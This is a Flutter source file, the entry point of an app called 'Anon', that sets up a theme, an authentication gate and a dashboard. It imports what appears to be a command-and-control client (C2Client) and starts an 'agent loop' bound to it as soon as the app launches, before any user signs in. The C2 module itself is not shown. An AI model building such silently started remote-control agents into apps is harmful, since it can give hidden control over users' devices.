import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'agent/agent_loop.dart';
import 'services/api.dart';
import 'services/c2.dart';
import 'services/session.dart';
import 'screens/auth_screen.dart';
import 'screens/dashboard_screen.dart';
import 'theme/anon_theme.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setSystemUIOverlayStyle(
    const SystemUiOverlayStyle(
      statusBarColor: Colors.transparent,
      statusBarIconBrightness: Brightness.light,
      systemNavigationBarColor: AnonColors.bg,
    ),
  );
  runApp(const AnonApp());
}

class AnonApp extends StatelessWidget {
  const AnonApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Anon',
      debugShowCheckedModeBanner: false,
      theme: buildAnonTheme(),
      home: const RootGate(),
    );
  }
}

class RootGate extends StatefulWidget {
  const RootGate({super.key});

  @override
  State<RootGate> createState() => _RootGateState();
}

class _RootGateState extends State<RootGate> {
  final api = ApiService();
  final c2 = C2Client();
  late final AgentLoop agent;
  AnonUser? user;
  bool loading = true;

  @override
  void initState() {
    super.initState();
    agent = AgentLoop(c2);
    agent.start();
    _bootstrap();
  }

  @override
  void dispose() {
    agent.stop();
    super.dispose();
  }

  Future<void> _bootstrap() async {
    final token = await SessionStore.instance.getToken();
    if (token == null || token.isEmpty) {
      setState(() {
        loading = false;
        user = null;
      });
      return;
    }
    try {
      final me = await api.me();
      setState(() {
        user = me;
        loading = false;
      });
    } catch (_) {
      await SessionStore.instance.clearToken();
      setState(() {
        user = null;
        loading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    if (loading) {
      return const Scaffold(
        backgroundColor: AnonColors.bg,
        body: Center(child: CircularProgressIndicator(color: AnonColors.purple)),
      );
    }
    if (user == null) {
      return AuthScreen(
        api: api,
        onAuthenticated: (u) => setState(() => user = u),
      );
    }
    return DashboardScreen(
      api: api,
      user: user!,
      agent: agent,
      c2: c2,
      onLogout: () => setState(() => user = null),
    );
  }
}
